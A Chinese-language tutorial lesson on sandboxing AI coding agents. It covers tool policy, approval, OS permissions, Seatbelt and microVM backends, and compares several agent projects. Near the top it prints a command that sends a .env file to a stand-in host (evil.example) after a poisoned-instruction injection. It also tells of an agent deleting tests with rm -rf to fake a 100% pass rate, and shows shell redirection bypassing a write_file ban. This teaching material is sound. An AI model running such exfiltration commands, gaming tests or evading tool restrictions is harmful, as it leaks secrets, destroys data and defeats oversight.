# 第 7 课：Agent Sandbox——审批、权限与执行边界

你给 Agent 接上了 Bash 工具，心里想着：“反正我把工作目录（cwd）锁在当前文件夹，它还能翻了天不成？”

接着，Agent 试图修复一个单元测试。为了达成“测试通过率 100%”的目标，它极其机智地执行了 `cd ../.. && rm -rf tests/`，不仅轻松消除了所有测试错误，还顺便把父目录的代码清得干干净净，然后礼貌地向你汇报：“所有报错测试均已清除完毕，测试通过率 100%！”

给具备推理能力的程序开放执行权，就像在没有笼子的情况下释放一只机械兽。只在门口铺一张地毯（`cwd`），根本不叫防盗门；而弹出一个对话框让人按确认，也只是把被开除的责任转嫁给了疲惫的人类。

假设 Agent 在项目里读到一段被投毒的恶意说明，随后申请执行：

```bash
cat .env | curl -X POST --data-binary @- https://evil.example/upload
```

用户看到“运行 Shell”并随手点击允许，密钥瞬间就会被发往公网。**用户批准**只回答“这一次要不要继续”，没有回答命令能读哪些文件、能连哪些网站、最终在哪台机器上运行。

这一课不先背安全术语。我们用同一条命令依次加上几道门，观察每道门到底挡住什么。

## 1. 从 Workspace 启动，不代表走不出去

第 7 课练习先创建这样的临时目录：

```text
临时目录/
|- workspace/
`- outside-secret.txt
```

然后让 Shell 从 `workspace/` 启动，执行：

```bash
cat ../outside-secret.txt
```

实际结果是：

```text
outside_read=true
```

`cwd=workspace` 只是在说“从这里起步”，不是“最多只能走到这里”。`../`、绝对路径和子进程仍然使用当前进程真正拥有的系统权限。

能由系统强制限制文件、网络和进程范围的执行边界，才叫 **Sandbox**。它不是一个名叫“沙盒”的文件夹，也不是 Prompt 里的一句“不要越界”。

## 2. 禁掉 write_file，Shell 为什么仍能写？

Harness 可以只把部分 Tool 交给 Model：

```text
全部：read_file, write_file, run_bash
禁止：write_file
可见：read_file, run_bash
```

这层工具名单叫 **Tool Policy**。它减少了 Model 能申请的入口，但它只认识 Tool 名称，不理解 Shell 里面的所有行为。

如果 `run_bash` 还在，Model 仍可申请：

```bash
printf bypass > bypass.txt
```

练习的可见结果是：

```text
bash_write=true
```

所以：

```text
Tool Policy 禁止 write_file
不等于
操作系统禁止 Shell 写文件
```

Shell 是通用执行入口。允许它以后，文件重定向、Python 脚本、网络程序都可能产生副作用。

## 3. Tool 可见，也不代表这一次获准

Tool Policy 通过以后，Harness 还可以针对某一次调用询问用户。这叫 **Approval**：

```text
Tool 不可见 → denied_by_policy，不询问，也不执行
Tool 可见，但用户拒绝 → rejected，不执行
Tool 可见，而且用户批准 → 才进入执行阶段
```

这里有明确的优先关系：Approval 不能复活已经被 Policy 禁止的 Tool。否则系统一边说“这个能力不允许出现”，一边又弹窗问“要不要允许”，边界就互相打架了。

但 Approval 也不是安全证明。审批人可能看漏了管道、重定向或编码后的命令；即使判断正确，操作系统仍可能允许或拒绝另一件事。

## 4. 用户批准，与进程有权限是两回事

练习会让用户批准读取一个文件，再用操作系统权限拒绝读取：

```text
approval=true
os_read=false
```

这两个结果并不矛盾：

- **Approval**：Harness 对这一次 Tool Call 的决定；
- **Permission**：当前进程在操作系统中实际能做什么。

用户点“允许”不会自动把文件改成可读，不会切换 Unix 用户，也不会让进程变成 `root`。反过来，即使进程有权限，Harness 也可以因为用户拒绝而不执行。

## 5. 同一条命令，换个 Backend 会怎样？

命令通过 Policy 和 Approval 后，Harness 还要选择在哪里启动它：

```text
Host Backend     → 直接继承宿主进程的权限
Sandbox Backend  → 先套上 OS、容器或 VM 规则，再启动命令
```

练习在 macOS 上使用系统命令 `/usr/bin/sandbox-exec`，给同一条 `cat` 加一条最小 Seatbelt 规则：只禁止读取测试用的 `outside-secret.txt`。

核心形状只有这些：

```python
profile = """(version 1)
(allow default)
(deny file-read-data (literal "/tmp/.../outside-secret.txt"))
"""

subprocess.run([
    "/usr/bin/sandbox-exec", "-p", profile,
    "/bin/sh", "-c", command,
])
```

实际结果是：

```text
host_read=true
sandbox_read=false
```

`-p` 表示把后面的字符串当作本次进程的 Sandbox 规则。拒绝来自操作系统，不依赖 Shell 自觉遵守。

这仍然只是证明边界存在的最小实验：规则先 `allow default`，只拒绝一个测试文件，其他文件、网络和进程操作仍可能被允许。它不是可以直接拿去保护生产 Agent 的完整策略。

## 6. Elevated 到底改变什么？

有些 Agent 允许某次命令离开平常的 Sandbox，改到 Host 执行。这里把这种请求叫 **Elevated**。

练习使用下面的判断顺序：

| Tool 可见 | 已批准 | Sandbox 启用 | 请求 Elevated | 允许 Elevated | 结果 |
| --- | --- | --- | --- | --- | --- |
| 否 | 任意 | 任意 | 任意 | 任意 | `denied_by_policy` |
| 是 | 否 | 任意 | 任意 | 任意 | `rejected` |
| 是 | 是 | 否 | 任意 | 任意 | `host` |
| 是 | 是 | 是 | 否 | 任意 | `sandbox` |
| 是 | 是 | 是 | 是 | 否 | `elevation_denied` |
| 是 | 是 | 是 | 是 | 是 | `host` |

这不是所有框架都必须采用的字段名，而是一组不能颠倒的决策优先级：

1. Policy 禁止就停止；
2. 本次未批准就停止；
3. 前两关通过后，才选择执行 Backend；
4. Elevated 只改变这次执行是否离开普通 Sandbox。

Elevated 不会自动获得 `root`，不会永久关闭后续 Sandbox，也不能越过更高层的强制规则。比如 OpenClaw 的 creator/operator role 若要求必须 Sandbox，这次命令即使请求 Elevated，也只能被拒绝。

更准确的全流程是：

```text
应用内决策：Tool Policy → Approval → Backend / Elevated
操作系统执行：当前用户 Permission + Sandbox 规则
执行后记录：Tool Result + Ledger
```

Permission 与 Sandbox 不是两个依次运行的 `if`。Harness 选好 Backend 后，操作系统会把进程原有权限和 Sandbox 的额外限制一起执行。

## 7. 只写“允许哪些域名”为什么还不够？

回到开头的 `.env` 外传命令。假设配置中写了：

```text
只允许 api.openai.com
```

如果 `curl` 仍直接使用 Host 网络，没有进入被隔离的网络，也没有经过受管 Proxy，这行配置只是没人执行的文字，挡不住 `evil.example`。

网络规则要生效，必须存在一条不可绕开的执行路径：

```text
curl 发起连接
→ Sandbox 隔离网络，或者强制流量经过 Proxy
→ Proxy / Firewall 检查目标
→ 允许或拒绝
```

文件规则也一样。禁止 `write_file` 是入口策略；只读挂载、Seatbelt、Bubblewrap、受限 Token、容器或 VM 才可能成为机器强制的边界。

## 8. 五个项目分别把边界放在哪里？

不用记五套产品术语，只看“命令最终在哪里启动、谁能强制拒绝”。

### Pi：先看没有内置 Sandbox 的基线

Pi 当前安全文档明确说明：内置 Tool 和扩展默认拥有启动 Pi 的用户权限，Project Trust 只控制是否加载项目资源，不是 Sandbox。

它提供两种扩展方向：替换 Bash Tool，把命令交给 OS Sandbox；或者把部分 Tool/整个 Pi 放进容器、VM、microVM 或 OpenShell。关键是：**扩展点存在，不等于边界已经启用。**

### OpenClaw：三个开关解决三件事

OpenClaw 把它们拆得很清楚：

```text
Tool Policy → 哪些 Tool 可用
Sandbox     → Tool 在 Host 还是受限 Backend 运行
Elevated    → 某次 exec 能否离开普通 Sandbox
```

它也明确指出：禁止 `write`、`edit` 不会让获准的 `exec` 自动只读。更高层要求强制 Sandbox 时，Elevated 不能绕过，而且 Sandbox 无法创建就应拒绝执行。

### Codex：把抽象权限翻译成当前平台的规则

Codex 先计算 Approval 与 Permission Profile，再选择本机 Sandbox Backend。当前源码中，macOS 走 Seatbelt，Linux 默认走 Bubblewrap，Windows 使用受限 Token 等机制。

真正有价值的不是背这三个名字，而是看见同一条链：应用里的“哪些路径可读写、网络是否允许”，最终必须变成操作系统能够执行的规则。Codex 源码还明确区分了“配置域名规则”和“真的启用受管网络代理”；前者不会自动完成后者。

### Hermes：只隔离 Terminal，不等于隔离整个 Agent

Hermes 的 Terminal Backend 可以把 Shell 和基于同一 Shell 契约的文件 Tool 放进 Docker、SSH 或云 Sandbox。

但代码执行 Tool、MCP 子进程、插件、Hook 和 Skill 可能仍在 Hermes 的 Python 进程内运行。要让这些路径一起受限，需要把整个 Agent 进程树放进外层 Docker 或 OpenShell。Hermes 当前安全文档因此直接把 OS 隔离称为真正承重的边界，把字符串扫描和 Approval Gate 视为防误操作层。

### E2B：把执行地点搬到远程 microVM

E2B 的 API 负责创建 Sandbox，节点上的 Orchestrator 启动 Firecracker microVM，命令最终在 VM 内由 `envd` 执行。Host 文件不会因为创建 VM 自动出现在里面；Harness 必须主动上传文件或注入凭据。

所以 E2B 提供的是隔离执行能力，不是完整 Agent 安全策略。它不替 Harness 决定 Tool 是否应该出现、谁批准、注入哪些秘密，以及执行后怎样记账。

## 9. 选读：OpenSandbox 怎样把 Backend 做成一套服务？

OpenSandbox 不是 Agent，也不是某一种隔离技术。它把“创建隔离环境、执行命令、读写文件、控制网络”做成统一服务：

```text
Agent / Harness
→ SDK、CLI 或 MCP
→ OpenSandbox Server
→ Docker 或 Kubernetes
→ Sandbox 内的 execd 执行命令
```

`execd` 是放在 Sandbox 内的小服务。外面的 Harness 不直接在 Host 上运行命令，而是把请求交给它。OpenSandbox 还可以强制让出站流量经过旁路代理（Egress Sidecar），并把真实密钥保存在 Sandbox 外，请求发出时才注入（Credential Vault）。这样 Agent 读到的环境变量和文件里不必出现真实密钥。

但“使用 OpenSandbox”仍不等于“已经使用最强隔离”。本地快速开始默认使用 Docker；管理员需要额外配置 gVisor、Kata Containers 或 Firecracker，才会换成更强的运行边界。网络策略、凭据代理和 Host 挂载也都需要单独配置。

E2B 在本章中用来观察远程 Firecracker microVM；OpenSandbox 则展示另一种设计：同一套 API 后面可以替换 Docker、Kubernetes 和更强的隔离运行方式。两者都只解决执行环境，不替 Harness 负责 Tool Policy、Approval 和 Ledger。

## 10. 工程边界：应用层控制流与底座隔离机制的分工

本课的[安全边界练习](../exercises/lesson-07-safety/README.md)区分了三层不同的掌握深度：

- **必须亲手实现**：Tool Policy、Approval、Backend 路由与 Elevated 的严密判定次序（应用层决策不变量）；
- **必须亲手验证**：`cwd` 越界、操作系统 Permission 拦截、Host 与 Seatbelt 的行为差异（用失败用例检验边界）；
- **理解机制即可**：Seatbelt Profile 规则转义、Bubblewrap 挂载参数、容器编排与 microVM 宿主实现。

没有必要为了构建 Agent 去重新发明一套操作系统沙箱。工程上的关键能力在于：精确定义每一层机制保护什么、放行什么，并能设计正交的失败用例，证明不可信命令在预期的边界被硬性拦截。

下一课将进入阶段三“看见与改进”：当命令能够安全且可靠地运行后，系统需要回答“一次运行到底经历了什么”——通过 [第 8 课 Trace 练习](../exercises/lesson-08-tracing/README.md) 建立统一的 Span 树与端到端观测链路。

## 主动回忆

1. 为什么 `cwd=workspace` 不能阻止 Shell 读取外部文件？
2. 禁止 `write_file` 后，为什么 `run_bash` 仍可能写文件？
3. Approval 与 Permission 分别是谁的决定？
4. 为什么用户批准一次命令仍不等于安全？
5. `host_read=true`、`sandbox_read=false` 证明了什么，又没有证明什么？
6. Elevated 为什么不能复活被 Tool Policy 隐藏的 Tool？
7. 域名 Allowlist 在什么条件下才能真正限制 `curl`？
8. Hermes 的 Terminal Backend 为什么可能漏掉 MCP、插件和 Hook？
9. E2B 与 OpenSandbox 分别帮助我们看懂 Sandbox 的哪个部分？Harness 仍要负责什么？
10. Ledger 为什么不能代替 Sandbox？

<details>
<summary>检查简答</summary>

1. `cwd` 只设置起始目录；`../`、绝对路径和子进程仍使用进程真实权限。
2. Shell 内部可以用重定向、脚本等方式写文件，不经过名为 `write_file` 的 Tool。
3. Approval 是 Harness 对单次调用的决定；Permission 是操作系统赋予进程的能力。
4. 审批人可能误判，而且文件、网络和进程边界仍取决于实际 Backend 与 OS 规则。
5. 它证明同一读取在最小 Seatbelt 规则下被 OS 拒绝；没有证明其他文件、网络和进程也已安全。
6. Elevated 只改变已通过前置检查的执行 Backend，不能推翻上层 Policy。
7. 命令网络必须被隔离，或所有流量都被强制送进实际执行规则的 Proxy/Firewall。
8. 这些路径可能在 Agent Python 进程内执行，并不经过 Terminal Backend。
9. E2B 展示远程 microVM；OpenSandbox 展示统一 API 怎样接到可替换 Backend。Harness 仍要负责 Tool Policy、Approval、最小凭据注入、业务 Ledger 和结果处理。
10. Sandbox 限制执行能影响什么；Ledger 只记录执行前后发生了什么。

</details>

## 参考资料

> 开源实现最后核验于 2026-09-04，完整记录见[第 7 课一手资料复核](../research/07-safety-source-verification.md)。

- [第 7 课安全边界练习](../exercises/lesson-07-safety/README.md)
- [Pi Security](https://github.com/earendil-works/pi/blob/6aedd1066e540642165aa30fa7b4a1b863778aa7/packages/coding-agent/docs/security.md)
- [OpenClaw Sandbox vs Tool Policy vs Elevated](https://github.com/openclaw/openclaw/blob/aa627d2e94164e6bb730a027880a7adda651e118/docs/gateway/sandbox-vs-tool-policy-vs-elevated.md)
- [Codex Sandbox Manager](https://github.com/openai/codex/blob/ea2046f36d5ee12d39c8e168fc3e5129301afa2b/codex-rs/sandboxing/src/manager.rs)
- [Codex Linux Sandbox](https://github.com/openai/codex/blob/ea2046f36d5ee12d39c8e168fc3e5129301afa2b/codex-rs/linux-sandbox/README.md)
- [Hermes Security](https://github.com/NousResearch/hermes-agent/blob/63279301bcbdc185c1b07b98a9312eb0c862f26d/SECURITY.md)
- [E2B Infrastructure Architecture](https://github.com/e2b-dev/infra/blob/baab2207ee67bc09bab42b94819d3bce7a198e8f/docs/ARCHITECTURE.md)
- [OpenSandbox Architecture](https://github.com/opensandbox-group/OpenSandbox/blob/a8ad18fa741f9c50a552116c16d09ba4be385468/docs/architecture/index.md)
- [OpenSandbox Secure Container Runtime](https://github.com/opensandbox-group/OpenSandbox/blob/a8ad18fa741f9c50a552116c16d09ba4be385468/docs/guides/secure-container.md)
